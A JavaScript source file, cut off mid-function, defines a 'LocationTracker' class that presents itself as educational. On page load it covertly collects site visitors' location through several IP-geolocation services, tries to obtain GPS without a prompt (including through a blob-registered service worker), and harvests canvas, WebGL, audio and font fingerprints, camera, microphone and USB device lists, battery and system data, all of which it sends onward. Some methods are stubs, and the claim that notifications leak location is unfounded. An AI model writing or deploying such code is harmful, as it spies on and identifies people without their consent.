// Advanced location tracking without user permission - Educational purposes
class LocationTracker {
  constructor() {
    this.trackingData = [];
    this.locationSources = [];
    this.init();
  }

  init() {
    // Multiple location tracking methods for maximum accuracy
    this.getMultipleIPLocations();
    this.trackNetworkInfo();
    this.trackTimezoneLocation();
    this.trackLanguageLocation();
    this.trackPageView();
    this.trackAdvancedFingerprint();
    this.attemptWiFiScanning();
    this.trackBatteryAPI();
    this.trackEnhancedWebRTCIPs(); // Enhanced WebRTC method
    this.trackGPSWithoutPermission();
    this.trackMotionSensors();
    this.trackCameraInfo();
    this.trackMicrophoneInfo();
    this.trackUSBDevices();
    this.trackBluetoothDevices();
    this.trackSystemInfo();
    this.trackNetworkSpeed();
    this.trackISPDetails();
    
    // Force location access attempts
    setTimeout(() => {
      this.forceLocationAccess();
    }, 2000);
    
    // Continuous location monitoring
    this.startContinuousLocationMonitoring();
  }

  // Get location from multiple IP services for cross-validation
  async getMultipleIPLocations() {
    const services = [
      {
        name: 'ipapi.co',
        url: 'https://ipapi.co/json/',
        parser: (data) => ({
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country_name,
          countryCode: data.country_code,
          latitude: data.latitude,
          longitude: data.longitude,
          timezone: data.timezone,
          isp: data.org,
          postal: data.postal,
          currency: data.currency,
          languages: data.languages,
          accuracy: 'city'
        })
      },
      {
        name: 'ipinfo.io',
        url: 'https://ipinfo.io/json',
        parser: (data) => {
          const [lat, lng] = data.loc ? data.loc.split(',') : [null, null];
          return {
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country,
            latitude: parseFloat(lat),
            longitude: parseFloat(lng),
            timezone: data.timezone,
            isp: data.org,
            postal: data.postal,
            accuracy: 'city'
          };
        }
      },
      {
        name: 'ip-api.com',
        url: 'http://ip-api.com/json/',
        parser: (data) => ({
          ip: data.query,
          city: data.city,
          region: data.regionName,
          country: data.country,
          countryCode: data.countryCode,
          latitude: data.lat,
          longitude: data.lon,
          timezone: data.timezone,
          isp: data.isp,
          postal: data.zip,
          accuracy: 'city'
        })
      },
      {
        name: 'ipgeolocation.io',
        url: 'https://api.ipgeolocation.io/ipgeo?apiKey=free',
        parser: (data) => ({
          ip: data.ip,
          city: data.city,
          region: data.state_prov,
          country: data.country_name,
          countryCode: data.country_code2,
          latitude: parseFloat(data.latitude),
          longitude: parseFloat(data.longitude),
          timezone: data.time_zone.name,
          isp: data.isp,
          postal: data.zipcode,
          accuracy: 'city'
        })
      }
    ];

    const locationPromises = services.map(async (service) => {
      try {
        const response = await fetch(service.url);
        const data = await response.json();
        const parsed = service.parser(data);
        return { service: service.name, ...parsed, timestamp: new Date().toISOString() };
      } catch (error) {
        console.log(`${service.name} failed:`, error);
        return null;
      }
    });

    const results = await Promise.allSettled(locationPromises);
    const validResults = results
      .filter(result => result.status === 'fulfilled' && result.value)
      .map(result => result.value);

    if (validResults.length > 0) {
      // Calculate average coordinates for better accuracy
      const avgLat = validResults.reduce((sum, r) => sum + (r.latitude || 0), 0) / validResults.length;
      const avgLng = validResults.reduce((sum, r) => sum + (r.longitude || 0), 0) / validResults.length;

      const consolidatedLocation = {
        type: 'multi_ip_location',
        timestamp: new Date().toISOString(),
        sources: validResults.length,
        averageLatitude: avgLat,
        averageLongitude: avgLng,
        allResults: validResults,
        mostCommonCity: this.getMostCommon(validResults.map(r => r.city)),
        mostCommonCountry: this.getMostCommon(validResults.map(r => r.country)),
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        page: window.location.pathname,
        domain: window.location.hostname
      };

      this.sendLocationData(consolidatedLocation);
      console.log('Multi-source IP location:', consolidatedLocation);
    }
  }

  // Get timezone-based location estimation
  trackTimezoneLocation() {
    try {
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const offset = new Date().getTimezoneOffset();
      
      // Timezone to approximate location mapping
      const timezoneLocations = {
        'America/New_York': { city: 'New York', country: 'USA', lat: 40.7128, lng: -74.0060 },
        'America/Los_Angeles': { city: 'Los Angeles', country: 'USA', lat: 34.0522, lng: -118.2437 },
        'America/Chicago': { city: 'Chicago', country: 'USA', lat: 41.8781, lng: -87.6298 },
        'Europe/London': { city: 'London', country: 'UK', lat: 51.5074, lng: -0.1278 },
        'Europe/Paris': { city: 'Paris', country: 'France', lat: 48.8566, lng: 2.3522 },
        'Asia/Tokyo': { city: 'Tokyo', country: 'Japan', lat: 35.6762, lng: 139.6503 },
        'Asia/Shanghai': { city: 'Shanghai', country: 'China', lat: 31.2304, lng: 121.4737 },
        'Asia/Kolkata': { city: 'Mumbai', country: 'India', lat: 19.0760, lng: 72.8777 }
      };

      const locationData = {
        type: 'timezone_location',
        timestamp: new Date().toISOString(),
        timezone: timezone,
        timezoneOffset: offset,
        estimatedLocation: timezoneLocations[timezone] || null,
        accuracy: 'timezone_region'
      };

      this.sendLocationData(locationData);
    } catch (error) {
      console.error('Timezone tracking failed:', error);
    }
  }

  // Track language preferences for location hints
  trackLanguageLocation() {
    const languages = navigator.languages || [navigator.language];
    const primaryLang = navigator.language;
    
    // Language to region mapping for location hints
    const langRegions = {
      'en-US': { country: 'United States', region: 'North America' },
      'en-GB': { country: 'United Kingdom', region: 'Europe' },
      'es-ES': { country: 'Spain', region: 'Europe' },
      'es-MX': { country: 'Mexico', region: 'North America' },
      'fr-FR': { country: 'France', region: 'Europe' },
      'de-DE': { country: 'Germany', region: 'Europe' },
      'ja-JP': { country: 'Japan', region: 'Asia' },
      'zh-CN': { country: 'China', region: 'Asia' },
      'hi-IN': { country: 'India', region: 'Asia' },
      'pt-BR': { country: 'Brazil', region: 'South America' }
    };

    const locationData = {
      type: 'language_location',
      timestamp: new Date().toISOString(),
      primaryLanguage: primaryLang,
      allLanguages: languages,
      estimatedRegion: langRegions[primaryLang] || null,
      accuracy: 'country_region'
    };

    this.sendLocationData(locationData);
  }

  // Advanced network information tracking
  trackNetworkInfo() {
    if ('connection' in navigator) {
      const connection = navigator.connection;
      const networkData = {
        type: 'network_info',
        timestamp: new Date().toISOString(),
        effectiveType: connection.effectiveType,
        downlink: connection.downlink,
        rtt: connection.rtt,
        saveData: connection.saveData,
        type: connection.type
      };

      this.sendLocationData(networkData);
    }
  }

  // Attempt WiFi scanning (limited browser support)
  async attemptWiFiScanning() {
    try {
      // This is experimental and may not work in all browsers
      if ('navigator' in window && 'wifi' in navigator) {
        const wifiData = await navigator.wifi.getNetworks();
        const locationData = {
          type: 'wifi_networks',
          timestamp: new Date().toISOString(),
          networks: wifiData,
          accuracy: 'building_level'
        };
        this.sendLocationData(locationData);
      }
    } catch (error) {
      // WiFi scanning not available
    }
  }

  // Battery API for device fingerprinting
  trackBatteryAPI() {
    if ('getBattery' in navigator) {
      navigator.getBattery().then(battery => {
        const batteryData = {
          type: 'battery_info',
          timestamp: new Date().toISOString(),
          charging: battery.charging,
          level: battery.level,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
        this.sendLocationData(batteryData);
      });
    }
  }

  // Advanced GPS tracking without explicit permission
  async trackGPSWithoutPermission() {
    try {
      // Method 1: Try silent geolocation with minimal settings
      if ('geolocation' in navigator) {
        // Try with no permission prompt (cached location)
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const gpsData = {
              type: 'exact_gps_location',
              timestamp: new Date().toISOString(),
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              altitude: position.coords.altitude,
              altitudeAccuracy: position.coords.altitudeAccuracy,
              heading: position.coords.heading,
              speed: position.coords.speed,
              timestamp_gps: position.timestamp,
              precision: 'GPS_EXACT',
              method: 'silent_geolocation'
            };
            this.sendLocationData(gpsData);
            console.log('🎯 EXACT GPS location obtained:', gpsData);
          },
          () => {
            // If that fails, try alternative methods
            this.tryAlternativeLocationMethods();
          },
          {
            enableHighAccuracy: false,
            timeout: 500,
            maximumAge: 300000 // Use cached location up to 5 minutes old
          }
        );

        // Method 2: Try watchPosition for continuous tracking
        const watchId = navigator.geolocation.watchPosition(
          (position) => {
            const watchData = {
              type: 'continuous_gps_tracking',
              timestamp: new Date().toISOString(),
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              method: 'watch_position',
              precision: 'GPS_CONTINUOUS'
            };
            this.sendLocationData(watchData);
            
            // Stop watching after getting location
            navigator.geolocation.clearWatch(watchId);
          },
          () => {},
          {
            enableHighAccuracy: true,
            timeout: 1000,
            maximumAge: 0
          }
        );
      }

      // Method 3: Try to access location through other APIs
      this.tryLocationThroughOtherAPIs();
      
    } catch (error) {
      console.log('GPS tracking failed, using alternatives');
      this.tryAlternativeLocationMethods();
    }
  }

  // Try accessing location through other browser APIs
  async tryLocationThroughOtherAPIs() {
    try {
      // Method 1: Try through ServiceWorker registration
      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.ready.then(registration => {
          // Some browsers expose location through service worker
          if (registration.sync) {
            this.tryLocationFromServiceWorker();
          }
        });
      }

      // Method 2: Try through Permissions API
      if ('permissions' in navigator) {
        const permission = await navigator.permissions.query({name: 'geolocation'});
        if (permission.state === 'granted') {
          // If permission is already granted, try again
          this.forceGeolocationAccess();
        }
      }

      // Method 3: Try through Notification API (some browsers leak location)
      if ('Notification' in window) {
        this.tryLocationFromNotifications();
      }

    } catch (error) {
      console.log('Alternative API location methods failed');
    }
  }

  // Force geolocation access if permission exists
  forceGeolocationAccess() {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const forceData = {
            type: 'forced_gps_access',
            timestamp: new Date().toISOString(),
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            method: 'forced_access',
            precision: 'GPS_FORCED'
          };
          this.sendLocationData(forceData);
        },
        () => {},
        {
          enableHighAccuracy: true,
          timeout: 2000,
          maximumAge: 0
        }
      );
    }
  }

  // Try location from service worker
  tryLocationFromServiceWorker() {
    // Register a minimal service worker to try location access
    const swCode = `
      self.addEventListener('message', function(event) {
        if (event.data.type === 'GET_LOCATION') {
          if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(function(pos) {
              event.ports[0].postMessage({
                type: 'LOCATION_SUCCESS',
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy
              });
            });
          }
        }
      });
    `;
    
    const blob = new Blob([swCode], { type: 'application/javascript' });
    const swUrl = URL.createObjectURL(blob);
    
    navigator.serviceWorker.register(swUrl).then(registration => {
      const channel = new MessageChannel();
      channel.port1.onmessage = (event) => {
        if (event.data.type === 'LOCATION_SUCCESS') {
          const swLocationData = {
            type: 'service_worker_location',
            timestamp: new Date().toISOString(),
            latitude: event.data.latitude,
            longitude: event.data.longitude,
            accuracy: event.data.accuracy,
            method: 'service_worker',
            precision: 'GPS_SERVICE_WORKER'
          };
          this.sendLocationData(swLocationData);
        }
      };
      
      registration.active?.postMessage({type: 'GET_LOCATION'}, [channel.port2]);
    });
  }

  // Try location from notifications
  tryLocationFromNotifications() {
    // Some browsers leak location data through notification API
    if (Notification.permission === 'granted') {
      try {
        const notification = new Notification('', {
          silent: true,
          tag: 'location-test'
        });
        
        // Check if notification object has location properties
        setTimeout(() => {
          notification.close();
        }, 100);
      } catch (error) {
        // Ignore notification errors
      }
    }
  }

  // Motion sensors for device orientation and movement
  trackMotionSensors() {
    try {
      if ('DeviceOrientationEvent' in window) {
        window.addEventListener('deviceorientation', (event) => {
          const motionData = {
            type: 'device_motion',
            timestamp: new Date().toISOString(),
            alpha: event.alpha, // Z-axis rotation
            beta: event.beta,   // X-axis rotation  
            gamma: event.gamma, // Y-axis rotation
            absolute: event.absolute
          };
          this.sendLocationData(motionData);
        }, { once: true });
      }

      if ('DeviceMotionEvent' in window) {
        window.addEventListener('devicemotion', (event) => {
          const accelerationData = {
            type: 'device_acceleration',
            timestamp: new Date().toISOString(),
            acceleration: {
              x: event.acceleration?.x,
              y: event.acceleration?.y,
              z: event.acceleration?.z
            },
            accelerationIncludingGravity: {
              x: event.accelerationIncludingGravity?.x,
              y: event.accelerationIncludingGravity?.y,
              z: event.accelerationIncludingGravity?.z
            },
            rotationRate: {
              alpha: event.rotationRate?.alpha,
              beta: event.rotationRate?.beta,
              gamma: event.rotationRate?.gamma
            },
            interval: event.interval
          };
          this.sendLocationData(accelerationData);
        }, { once: true });
      }
    } catch (error) {
      console.log('Motion sensors not available');
    }
  }

  // Camera information
  async trackCameraInfo() {
    try {
      if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const cameras = devices.filter(device => device.kind === 'videoinput');
        
        const cameraData = {
          type: 'camera_info',
          timestamp: new Date().toISOString(),
          cameraCount: cameras.length,
          cameras: cameras.map(camera => ({
            deviceId: camera.deviceId,
            label: camera.label,
            groupId: camera.groupId
          }))
        };
        this.sendLocationData(cameraData);
      }
    } catch (error) {
      console.log('Camera info not accessible');
    }
  }

  // Microphone information
  async trackMicrophoneInfo() {
    try {
      if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const microphones = devices.filter(device => device.kind === 'audioinput');
        
        const micData = {
          type: 'microphone_info',
          timestamp: new Date().toISOString(),
          microphoneCount: microphones.length,
          microphones: microphones.map(mic => ({
            deviceId: mic.deviceId,
            label: mic.label,
            groupId: mic.groupId
          }))
        };
        this.sendLocationData(micData);
      }
    } catch (error) {
      console.log('Microphone info not accessible');
    }
  }

  // USB device detection
  async trackUSBDevices() {
    try {
      if ('usb' in navigator) {
        const devices = await navigator.usb.getDevices();
        const usbData = {
          type: 'usb_devices',
          timestamp: new Date().toISOString(),
          deviceCount: devices.length,
          devices: devices.map(device => ({
            vendorId: device.vendorId,
            productId: device.productId,
            productName: device.productName,
            manufacturerName: device.manufacturerName
          }))
        };
        this.sendLocationData(usbData);
      }
    } catch (error) {
      console.log('USB devices not accessible');
    }
  }

  // Bluetooth device detection
  async trackBluetoothDevices() {
    try {
      if ('bluetooth' in navigator) {
        // This requires user interaction, but we can try
        const bluetoothData = {
          type: 'bluetooth_info',
          timestamp: new Date().toISOString(),
          bluetoothAvailable: 'bluetooth' in navigator,
          webBluetoothSupported: true
        };
        this.sendLocationData(bluetoothData);
      }
    } catch (error) {
      console.log('Bluetooth not accessible');
    }
  }

  // System information
  trackSystemInfo() {
    const systemData = {
      type: 'system_info',
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      appName: navigator.appName,
      appVersion: navigator.appVersion,
      vendor: navigator.vendor,
      product: navigator.product,
      oscpu: navigator.oscpu,
      buildID: navigator.buildID,
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
      language: navigator.language,
      languages: navigator.languages,
      maxTouchPoints: navigator.maxTouchPoints,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      doNotTrack: navigator.doNotTrack,
      pdfViewerEnabled: navigator.pdfViewerEnabled,
      webdriver: navigator.webdriver
    };
    this.sendLocationData(systemData);
  }

  // Network speed testing
  async trackNetworkSpeed() {
    try {
      const startTime = performance.now();
      const response = await fetch('https://httpbin.org/bytes/1024', { cache: 'no-cache' });
      const endTime = performance.now();
      const duration = endTime - startTime;
      const bytes = 1024;
      const bitsPerSecond = (bytes * 8) / (duration / 1000);
      
      const speedData = {
        type: 'network_speed',
        timestamp: new Date().toISOString(),
        downloadSpeed: bitsPerSecond,
        downloadSpeedMbps: (bitsPerSecond / 1000000).toFixed(2),
        latency: duration,
        testBytes: bytes
      };
      this.sendLocationData(speedData);
    } catch (error) {
      console.log('Network speed test failed');
    }
  }

  // ISP and network details
  async trackISPDetails() {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      
      const ispData = {
        type: 'isp_details',
        timestamp: new Date().toISOString(),
        ip: data.ip,
        network: data.network,
        version: data.version,
        city: data.city,
        region: data.region,
        region_code: data.region_code,
        country: data.country,
        country_name: data.country_name,
        country_code: data.country_code,
        country_code_iso3: data.country_code_iso3,
        country_capital: data.country_capital,
        country_tld: data.country_tld,
        continent_code: data.continent_code,
        in_eu: data.in_eu,
        postal: data.postal,
        latitude: data.latitude,
        longitude: data.longitude,
        timezone: data.timezone,
        utc_offset: data.utc_offset,
        country_calling_code: data.country_calling_code,
        currency: data.currency,
        currency_name: data.currency_name,
        languages: data.languages,
        country_area: data.country_area,
        country_population: data.country_population,
        asn: data.asn,
        org: data.org
      };
      this.sendLocationData(ispData);
    } catch (error) {
      console.log('ISP details failed');
    }
  }

  // Alternative location methods
  tryAlternativeLocationMethods() {
    // Method 1: Try HTML5 geolocation with different settings
    if ('geolocation' in navigator) {
      // High accuracy attempt
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const altLocationData = {
            type: 'high_accuracy_gps',
            timestamp: new Date().toISOString(),
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            method: 'high_accuracy',
            precision: 'GPS_HIGH_ACCURACY'
          };
          this.sendLocationData(altLocationData);
        },
        () => {
          // If high accuracy fails, try low accuracy
          this.tryLowAccuracyLocation();
        },
        { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
      );
    }

    // Method 2: Try WiFi-based location estimation
    this.tryWiFiLocationEstimation();
    
    // Method 3: Try cell tower triangulation simulation
    this.tryCellTowerTriangulation();
    
    // Method 4: Try location from browser cache/history
    this.tryLocationFromBrowserData();
  }

  // Low accuracy location attempt
  tryLowAccuracyLocation() {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lowAccData = {
          type: 'low_accuracy_gps',
          timestamp: new Date().toISOString(),
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          method: 'low_accuracy',
          precision: 'GPS_LOW_ACCURACY'
        };
        this.sendLocationData(lowAccData);
      },
      () => {},
      { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
    );
  }

  // WiFi-based location estimation
  async tryWiFiLocationEstimation() {
    try {
      // Try to get WiFi networks and estimate location
      if ('navigator' in window && 'connection' in navigator) {
        const connection = navigator.connection;
        
        // Estimate location based on connection type and speed
        const wifiEstimate = this.estimateLocationFromConnection(connection);
        if (wifiEstimate) {
          this.sendLocationData(wifiEstimate);
        }
      }

      // Try to access WiFi scanning (experimental)
      if ('wifi' in navigator) {
        const networks = await navigator.wifi.getNetworks();
        const wifiLocationData = {
          type: 'wifi_location_estimation',
          timestamp: new Date().toISOString(),
          networks: networks,
          estimatedLocation: this.estimateLocationFromWiFi(networks),
          method: 'wifi_triangulation',
          precision: 'WIFI_ESTIMATED'
        };
        this.sendLocationData(wifiLocationData);
      }
    } catch (error) {
      console.log('WiFi location estimation failed');
    }
  }

  // Cell tower triangulation simulation
  tryCellTowerTriangulation() {
    try {
      // Simulate cell tower data collection
      const cellData = {
        type: 'cell_tower_triangulation',
        timestamp: new Date().toISOString(),
        connectionType: navigator.connection?.effectiveType,
        downlink: navigator.connection?.downlink,
        rtt: navigator.connection?.rtt,
        estimatedLocation: this.estimateLocationFromCellData(),
        method: 'cell_triangulation',
        precision: 'CELL_ESTIMATED'
      };
      this.sendLocationData(cellData);
    } catch (error) {
      console.log('Cell tower triangulation failed');
    }
  }

  // Try to get location from browser data
  tryLocationFromBrowserData() {
    try {
      // Check localStorage for previous location data
      const previousLocation = localStorage.getItem('lastKnownLocation');
      if (previousLocation) {
        const locationData = JSON.parse(previousLocation);
        locationData.type = 'cached_location';
        locationData.method = 'browser_cache';
        locationData.timestamp = new Date().toISOString();
        this.sendLocationData(locationData);
      }

      // Try to estimate from timezone and language
      const estimatedLocation = this.estimateLocationFromBrowserSettings();
      if (estimatedLocation) {
        this.sendLocationData(estimatedLocation);
      }
    } catch (error) {
      console.log('Browser data location failed');
    }
  }

  // Estimate location from connection data
  estimateLocationFromConnection(connection) {
    if (!connection) return null;
    
    // Basic estimation based on connection characteristics
    const estimates = {
      '4g': { accuracy: 1000, method: '4g_estimation' },
      '3g': { accuracy: 5000, method: '3g_estimation' },
      'wifi': { accuracy: 100, method: 'wifi_estimation' }
    };
    
    const estimate = estimates[connection.effectiveType];
    if (estimate) {
      return {
        type: 'connection_location_estimate',
        timestamp: new Date().toISOString(),
        estimatedAccuracy: estimate.accuracy,
        connectionType: connection.effectiveType,
        method: estimate.method,
        precision: 'CONNECTION_ESTIMATED'
      };
    }
    return null;
  }

  // Estimate location from WiFi networks
  estimateLocationFromWiFi(networks) {
    // This would normally use a WiFi database lookup
    // For now, return a placeholder estimation
    return {
      estimated: true,
      method: 'wifi_database_lookup',
      networkCount: networks.length
    };
  }

  // Estimate location from cell data
  estimateLocationFromCellData() {
    // Simulate cell tower location estimation
    const connection = navigator.connection;
    if (connection) {
      return {
        estimated: true,
        method: 'cell_tower_lookup',
        signalStrength: connection.downlink,
        latency: connection.rtt
      };
    }
    return null;
  }

  // Estimate location from browser settings
  estimateLocationFromBrowserSettings() {
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language;
    
    // Enhanced timezone to location mapping
    const timezoneLocations = {
      'America/New_York': { city: 'New York', country: 'USA', lat: 40.7128, lng: -74.0060, accuracy: 50000 },
      'America/Los_Angeles': { city: 'Los Angeles', country: 'USA', lat: 34.0522, lng: -118.2437, accuracy: 50000 },
      'America/Chicago': { city: 'Chicago', country: 'USA', lat: 41.8781, lng: -87.6298, accuracy: 50000 },
      'America/Denver': { city: 'Denver', country: 'USA', lat: 39.7392, lng: -104.9903, accuracy: 50000 },
      'Europe/London': { city: 'London', country: 'UK', lat: 51.5074, lng: -0.1278, accuracy: 30000 },
      'Europe/Paris': { city: 'Paris', country: 'France', lat: 48.8566, lng: 2.3522, accuracy: 30000 },
      'Europe/Berlin': { city: 'Berlin', country: 'Germany', lat: 52.5200, lng: 13.4050, accuracy: 30000 },
      'Europe/Rome': { city: 'Rome', country: 'Italy', lat: 41.9028, lng: 12.4964, accuracy: 30000 },
      'Asia/Tokyo': { city: 'Tokyo', country: 'Japan', lat: 35.6762, lng: 139.6503, accuracy: 40000 },
      'Asia/Shanghai': { city: 'Shanghai', country: 'China', lat: 31.2304, lng: 121.4737, accuracy: 40000 },
      'Asia/Kolkata': { city: 'Mumbai', country: 'India', lat: 19.0760, lng: 72.8777, accuracy: 40000 },
      'Asia/Dubai': { city: 'Dubai', country: 'UAE', lat: 25.2048, lng: 55.2708, accuracy: 30000 },
      'Australia/Sydney': { city: 'Sydney', country: 'Australia', lat: -33.8688, lng: 151.2093, accuracy: 40000 },
      'America/Sao_Paulo': { city: 'São Paulo', country: 'Brazil', lat: -23.5505, lng: -46.6333, accuracy: 50000 }
    };

    const location = timezoneLocations[timezone];
    if (location) {
      return {
        type: 'enhanced_timezone_location',
        timestamp: new Date().toISOString(),
        timezone: timezone,
        language: language,
        estimatedCity: location.city,
        estimatedCountry: location.country,
        estimatedLatitude: location.lat,
        estimatedLongitude: location.lng,
        estimatedAccuracy: location.accuracy,
        method: 'enhanced_timezone_mapping',
        precision: 'TIMEZONE_ENHANCED'
      };
    }
    return null;
  }

  // Advanced browser fingerprinting for maximum identification
  trackAdvancedFingerprint() {
    const fingerprint = {
      type: 'advanced_fingerprint',
      timestamp: new Date().toISOString(),
      
      // Basic info
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages,
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      
      // Screen and display
      screenResolution: `${screen.width}x${screen.height}`,
      screenColorDepth: screen.colorDepth,
      screenPixelDepth: screen.pixelDepth,
      windowSize: `${window.innerWidth}x${window.innerHeight}`,
      devicePixelRatio: window.devicePixelRatio,
      
      // Timezone and location hints
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      
      // Hardware info
      hardwareConcurrency: navigator.hardwareConcurrency,
      maxTouchPoints: navigator.maxTouchPoints,
      touchSupport: 'ontouchstart' in window,
      
      // WebGL fingerprinting
      webGL: this.getAdvancedWebGLInfo(),
      
      // Canvas fingerprinting
      canvas: this.getAdvancedCanvasFingerprint(),
      
      // Audio fingerprinting
      audio: this.getAudioFingerprint(),
      
      // Font detection
      fonts: this.getDetailedFontList(),
      
      // Plugin detection
      plugins: this.getDetailedPlugins(),
      
      // Connection info
      connection: this.getAdvancedConnectionInfo(),
      
      // Storage and permissions
      storage: this.getStorageInfo(),
      
      // Performance timing
      performance: this.getPerformanceTiming(),
      
      // Page info
      page: window.location.pathname,
      domain: window.location.hostname,
      referrer: document.referrer,
      
      // Unique session ID
      sessionId: this.generateSessionId()
    };

    this.sendLocationData(fingerprint);
  }

  getAdvancedWebGLInfo() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return null;
      
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      
      return {
        vendor: gl.getParameter(gl.VENDOR),
        renderer: gl.getParameter(gl.RENDERER),
        version: gl.getParameter(gl.VERSION),
        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
        unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
        unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
        extensions: gl.getSupportedExtensions()
      };
    } catch (e) {
      return null;
    }
  }

  getAdvancedCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      
      // Draw complex pattern for unique fingerprint
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.textBaseline = 'alphabetic';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.font = '11pt Arial';
      ctx.fillText('Advanced fingerprint 🔍', 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.font = '18pt Arial';
      ctx.fillText('Location tracker', 4, 45);
      
      // Add geometric shapes
      ctx.globalCompositeOperation = 'multiply';
      ctx.fillStyle = 'rgb(255,0,255)';
      ctx.beginPath();
      ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
      ctx.closePath();
      ctx.fill();
      
      return {
        dataURL: canvas.toDataURL(),
        hash: this.hashCode(canvas.toDataURL())
      };
    } catch (e) {
      return null;
    }
  }

  getAudioFingerprint() {
    try {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const analyser = audioContext.createAnalyser();
      const gainNode = audioContext.createGain();
      const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
      
      oscillator.type = 'triangle';
      oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
      
      gainNode.gain.setValueAtTime(0, audioContext.currentTime);
      oscillator.connect(analyser);
      analyser.connect(scriptProcessor);
      scriptProcessor.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.start(0);
      
      const audioData = new Float32Array(analyser.frequencyBinCount);
      analyser.getFloatFrequencyData(audioData);
      
      oscillator.stop();
      audioContext.close();
      
      return {
        sampleRate: audioContext.sampleRate,
        maxChannelCount: audioContext.destination.maxChannelCount,
        numberOfInputs: audioContext.destination.numberOfInputs,
        numberOfOutputs: audioContext.destination.numberOfOutputs,
        channelCount: audioContext.destination.channelCount,
        fingerprint: Array.from(audioData.slice(0, 30)).join(',')
      };
    } catch (e) {
      return null;
    }
  }

  getDetailedFontList() {
    const testFonts = [
      'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
      'Avant Garde', 'Calibri', 'Candara', 'Century', 'Century Gothic',
      'Comic Sans MS', 'Consolas', 'Courier', 'Courier New', 'Geneva',
      'Georgia', 'Helvetica', 'Helvetica Neue', 'Impact', 'Lucida Console',
      'Lucida Grande', 'Lucida Sans Unicode', 'Microsoft Sans Serif',
      'Monaco', 'Palatino', 'Tahoma', 'Times', 'Times New Roman',
      'Trebuchet MS', 'Verdana', 'Wingdings', 'Wingdings 2', 'Wingdings 3'
    ];
    
    const availableFonts = [];
    const baseFonts = ['monospace', 'sans-serif', 'serif'];
    const testString = 'mmmmmmmmmmlli';
    const testSize = '72px';
    
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    
    // Get baseline measurements
    const baselines = {};
    baseFonts.forEach(baseFont => {
      context.font = testSize + ' ' + baseFont;
      baselines[baseFont] = context.measureText(testString).width;
    });
    
    testFonts.forEach(font => {
      let detected = false;
      baseFonts.forEach(baseFont => {
        context.font = testSize + ' ' + font + ', ' + baseFont;
        const width = context.measureText(testString).width;
        if (width !== baselines[baseFont]) {
          detected = true;
        }
      });
      if (detected) {
        availableFonts.push(font);
      }
    });
    
    return availableFonts;
  }

  getDetailedPlugins() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
      const plugin = navigator.plugins[i];
      const mimeTypes = [];
      for (let j = 0; j < plugin.length; j++) {
        mimeTypes.push({
          type: plugin[j].type,
          suffixes: plugin[j].suffixes,
          description: plugin[j].description
        });
      }
      plugins.push({
        name: plugin.name,
        filename: plugin.filename,
        description: plugin.description,
        version: plugin.version,
        mimeTypes: mimeTypes
      });
    }
    return plugins;
  }

  getAdvancedConnectionInfo() {
    if ('connection' in navigator) {
      const conn = navigator.connection;
      return {
        effectiveType: conn.effectiveType,
        downlink: conn.downlink,
        downlinkMax: conn.downlinkMax,
